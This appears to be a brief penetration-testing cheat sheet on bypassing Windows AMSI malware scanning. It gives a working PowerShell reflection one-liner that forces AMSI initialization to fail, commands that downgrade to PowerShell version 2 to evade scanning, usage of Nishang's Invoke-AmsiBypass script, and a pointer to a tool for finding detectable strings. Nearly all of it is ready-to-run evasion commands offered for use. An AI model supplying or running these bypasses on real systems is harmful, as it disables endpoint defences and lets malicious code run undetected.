# AMSI Bypass

AMSI is short for Antimalware Scan Interface.

The goal of AMSI is to prevent the execution of arbitrary code containing malicious content.

## Basic - Forcing an AMSI Initialization Failure

Likely detectable

`[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`

## Downgrading PowerShell

`powershell.exe -version 2`

`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 2`

checking version

`$PSVersionTable`


## Nishang

https://raw.githubusercontent.com/samratashok/nishang/master/Bypass/Invoke-AmsiBypass.ps1

`. .\Invoke-AmsiBypass.ps1`

Or copy the code from github and paste it directly into the powershell console

`Invoke-AmsiBypass -Verbose`

## AMSITrigger - Find Detectable Strings

`https://github.com/RythmStick/AMSITrigger`

